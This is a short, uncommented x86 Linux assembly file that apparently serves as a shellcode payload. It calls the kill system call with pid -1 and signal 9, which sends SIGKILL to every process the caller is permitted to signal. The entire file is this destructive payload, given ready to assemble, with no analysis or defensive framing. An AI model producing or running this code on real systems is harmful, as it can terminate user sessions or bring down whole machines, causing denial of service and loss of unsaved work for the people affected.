global _start

section .text

_start:

	push 37
	pop eax
	push byte -1
	pop ebx
	push byte 9
	pop ecx
	int 0x80
